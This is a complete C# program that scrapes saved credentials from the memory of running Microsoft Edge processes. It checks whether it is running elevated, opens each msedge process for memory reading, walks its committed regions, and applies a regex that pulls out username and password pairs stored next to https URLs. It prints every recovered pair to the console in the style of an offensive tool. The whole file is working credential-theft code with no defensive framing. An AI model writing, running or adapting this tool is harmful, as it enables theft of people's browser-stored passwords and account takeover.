using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;

class Program
{
    const uint PROCESS_QUERY_INFORMATION = 0x0400;
    const uint PROCESS_VM_READ = 0x0010;

    const uint MEM_COMMIT = 0x1000;

    const uint PAGE_READWRITE = 0x04;
    const uint PAGE_WRITECOPY = 0x08;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_EXECUTE_WRITECOPY = 0x80;

    const int CHUNK_SIZE = 1024 * 1024;

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        int dwProcessId
    );

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead
    );

    [DllImport("kernel32.dll")]
    static extern int VirtualQueryEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        out MEMORY_BASIC_INFORMATION lpBuffer,
        uint dwLength
    );

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(
        IntPtr ProcessHandle,
        uint DesiredAccess,
        out IntPtr TokenHandle
    );

    class ProcessInfo
    {
        public int Id;
        public string Name;
        public string Owner;
    }

    static string GetProcessOwnerFromToken(int pid)
    {
        try
        {
            IntPtr hProcess = OpenProcess(0x1000, false, pid);

            if (hProcess == IntPtr.Zero)
                return "UNKNOWN";

            IntPtr hToken;

            if (!OpenProcessToken(hProcess, 8, out hToken))
            {
                CloseHandle(hProcess);
                return "UNKNOWN";
            }

            try
            {
                WindowsIdentity wi = new WindowsIdentity(hToken);
                return wi.Name ?? "UNKNOWN";
            }
            catch
            {
                return "UNKNOWN";
            }
            finally
            {
                CloseHandle(hToken);
                CloseHandle(hProcess);
            }
        }
        catch
        {
            return "UNKNOWN";
        }
    }

    static bool IsReadableProtection(uint protect)
    {
        return
            protect == PAGE_READWRITE ||
            protect == PAGE_WRITECOPY ||
            protect == PAGE_EXECUTE_READWRITE ||
            protect == PAGE_EXECUTE_WRITECOPY;
    }

    static bool IsPrintable(string input)
    {
        foreach (char c in input)
        {
            if (char.IsControl(c))
                return false;
        }

        return true;
    }

    static void Main()
    {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);

        bool isElevated = principal.IsInRole(
            WindowsBuiltInRole.Administrator
        );

        if (!isElevated)
        {
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("[!]");
            Console.ResetColor();
            Console.WriteLine(" Running without elevation.\n");
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.Write("[+]");
            Console.ResetColor();
            Console.WriteLine(" Running elevated.\n");
        }

        Console.WriteLine("[*] Enumerating Edge processes...\n");

        List<ProcessInfo> processList = new List<ProcessInfo>();

        foreach (Process proc in Process.GetProcessesByName("msedge"))
        {
            try
            {
                processList.Add(new ProcessInfo
                {
                    Id = proc.Id,
                    Name = proc.ProcessName,
                    Owner = GetProcessOwnerFromToken(proc.Id)
                });
            }
            catch {}
        }

        Console.WriteLine($"[*] Found {processList.Count} Edge processes.\n");

        HashSet<string> seen = new HashSet<string>();

        int totalMatches = 0;

        foreach (var proc in processList)
        {
            Console.WriteLine(
                $"[*] PID: {proc.Id}\tOwner: {proc.Owner}"
            );

            IntPtr processHandle = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                false,
                proc.Id
            );

            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine("    [-] Failed to open process.");
                continue;
            }

            try
            {
                IntPtr address = IntPtr.Zero;

                MEMORY_BASIC_INFORMATION memInfo;

                while (
                    VirtualQueryEx(
                        processHandle,
                        address,
                        out memInfo,
                        (uint)Marshal.SizeOf(
                            typeof(MEMORY_BASIC_INFORMATION)
                        )
                    ) != 0
                )
                {
                    bool readable =
                        memInfo.State == MEM_COMMIT &&
                        IsReadableProtection(memInfo.Protect);

                    if (readable)
                    {
                        long regionSize =
                            (long)memInfo.RegionSize;

                        long offset = 0;

                        while (offset < regionSize)
                        {
                            int toRead = (int)Math.Min(
                                CHUNK_SIZE,
                                regionSize - offset
                            );

                            byte[] buffer = new byte[toRead];

                            IntPtr bytesRead;

                            IntPtr readAddress = new IntPtr(
                                memInfo.BaseAddress.ToInt64() + offset
                            );

                            bool success = ReadProcessMemory(
                                processHandle,
                                readAddress,
                                buffer,
                                toRead,
                                out bytesRead
                            );

                            if (success && bytesRead.ToInt64() > 0)
                            {
                                string utf8 =
                                    Encoding.UTF8.GetString(buffer);

                                string[] lines =
                                    Regex.Split(
                                        utf8,
                                        @"\r\n|\r|\n"
                                    );

                                foreach (string line in lines)
                                {
                                    /*
                                       ORIGINAL STYLE REGEX
                                       username + password pair near https
                                    */

                                    string pattern =
                                        @"[a-zA-Z]https?\x20([a-zA-Z0-9\\._@\-]{1,64})\x20([^\x00\s]{1,64})\x20\x00";

                                    MatchCollection matches =
                                        Regex.Matches(
                                            line,
                                            pattern
                                        );

                                    foreach (Match match in matches)
                                    {
                                        try
                                        {
                                            string username =
                                                match.Groups[1].Value
                                                .Trim();

                                            string password =
                                                match.Groups[2].Value
                                                .Trim();

                                            if (
                                                username.Length < 2 ||
                                                password.Length < 2
                                            )
                                                continue;

                                            if (
                                                !IsPrintable(username) ||
                                                !IsPrintable(password)
                                            )
                                                continue;

                                            /*
                                               Remove junk results
                                            */

                                            if (
                                                username.Contains("https") ||
                                                password.Contains("https")
                                            )
                                                continue;

                                            if (
                                                username.Contains("microsoft") ||
                                                password.Contains("microsoft")
                                            )
                                                continue;

                                            if (
                                                password.Length > 64
                                            )
                                                continue;

                                            string combined =
                                                $"{username}:{password}";

                                            if (!seen.Contains(combined))
                                            {
                                                seen.Add(combined);

                                                Console.ForegroundColor =
                                                    ConsoleColor.Green;

                                                Console.WriteLine(
                                                    $"    [+] {combined}"
                                                );

                                                Console.ResetColor();

                                                totalMatches++;
                                            }
                                        }
                                        catch {}
                                    }
                                }
                            }

                            offset += toRead;
                        }
                    }

                    address = new IntPtr(
                        memInfo.BaseAddress.ToInt64() +
                        (long)memInfo.RegionSize
                    );
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(
                    $"    [-] {ex.Message}"
                );
            }
            finally
            {
                CloseHandle(processHandle);
            }
        }

        Console.WriteLine(
            $"\n[*] Total matches: {totalMatches}"
        );
    }
}
